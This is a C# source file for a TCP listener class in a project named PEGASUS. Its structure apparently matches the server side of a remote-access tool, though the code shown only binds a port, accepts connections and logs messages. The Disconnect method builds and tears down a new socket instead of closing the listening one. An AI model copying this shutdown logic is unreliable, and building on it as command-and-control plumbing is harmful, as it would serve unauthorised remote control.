using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using PEGASUS.Handle_Packet;

namespace PEGASUS.Connection
{
	internal class Listener
	{
		private Socket Server { get; set; }

		public void Connect(object port)
		{
			try
			{
				IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
				Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
				{
					SendBufferSize = 51200,
					ReceiveBufferSize = 51200
				};
				Server.Bind(localEP);
				Server.Listen(500);
				new HandleLogs().Addmsg($"Listenning to: {port}", Color.FromArgb(3, 130, 200));
				Server.BeginAccept(EndAccept, null);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
				Environment.Exit(0);
			}
		}

		public void Disconnect(object port)
		{
			new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
			Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				SendBufferSize = 51200,
				ReceiveBufferSize = 51200
			};
			Server.BeginDisconnect(reuseSocket: true, EndAccept, null);
			Server.Disconnect(reuseSocket: true);
			Server.Dispose();
			Server.Close();
		}

		private void EndAccept(IAsyncResult ar)
		{
			try
			{
				new Clients(Server.EndAccept(ar));
			}
			catch
			{
			}
			finally
			{
				Server.BeginAccept(EndAccept, null);
			}
		}
	}
}